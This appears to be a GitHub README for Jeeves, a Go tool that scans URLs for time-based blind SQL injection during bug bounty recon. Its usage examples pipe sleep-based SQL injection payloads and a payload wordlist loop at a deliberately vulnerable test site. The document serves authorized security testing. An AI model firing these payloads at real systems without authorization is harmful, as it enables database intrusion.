<h1 align="center">Jeeves</h1> <br>

<p align="center">
  <a href="#--usage--explanation">Usage</a> •
  <a href="#--installation--requirements">Installation</a>
</p>

<h3 align="center">Jeeves is made for looking to Time-Based Blind SQLInjection through recon.</h3>
<img src="gojayyyy.png">

## - Installation & Requirements:
```
> go install github.com/ferreiraklet/Jeeves@latest

OR

> git clone https://github.com/ferreiraklet/Jeeves.git

> cd Jeeves

> go build jeeves.go

> chmod +x jeeves

> ./jeeves -h
```
<br>


## - Usage & Explanation:
  * In Your recon process, you may find endpoints that can be vulnerable to sql injection,
  
    * Ex: https://redacted.com/index.php?id=1

    <br>
  
    Jeeves reads from stdin:
    
   
    
    `echo 'https://redacted.com/index.php?id=your_time_based_blind_payload_here' | jeeves --payload-time time_payload`
    <br>
  
    In --payload-time you must use the time mentioned in payload.
 
    <br>
    
    **You can use a file containing a list of targets as well**:
  
    `cat targets | jeeves --payload-time 5`
  
    <br>
    
 * **You are able to use of Jeeves with other tools, such as gau, gauplus, waybackurls, qsreplace and bhedak, mastering his strenght**
    <br>
    * Another examples of usage:
  
    
      ```bash
       Usage:
       --payload-time,      The time from payload
       --proxy              Send traffic to a proxy
       -c                   Set Concurrency
       -H, --headers        Custom Headers
       -h                   Show This Help Message
      ```
       
       
  
    Ex 1 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5`
    
    <br>
    
    Ex 2 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(10)))v)" | jeeves --payload-time 10`
    
    <br>
    
    Ex 3 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://ip:port"`
    
    <br>
    
    Ex 4 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://ip:port" -H "User-Agent: xxxx"`
    
    <br>
    
    You can specify more than one header, OBS: Be careful, the syntax must be exact the same, Ex:
    
    Ex 5 - `echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 -H "Testing: testing;OtherHeader: Value;Other2: Value"`
    
    TIP:
    
    Using with sql payloads wordlist
    `cat sql_wordlist.txt | while read payload;do echo http://testphp.vulnweb.com/artists.php?artist= | qsreplace $payload | jeeves --payload-time 5;done`
    
    
    OBS: 
    * Does not follow redirects, If the Status Code is diferent than 200, it returns "Need Manual Analisys"
    * Jeeves does not http probing, he is not able to do requests to urls that does not contain protocol ( http://, https:// )

<br>


## This project is for educational and bug bounty porposes only! I do not support any illegal activities!.

If any error in the program, talk to me immediatly.
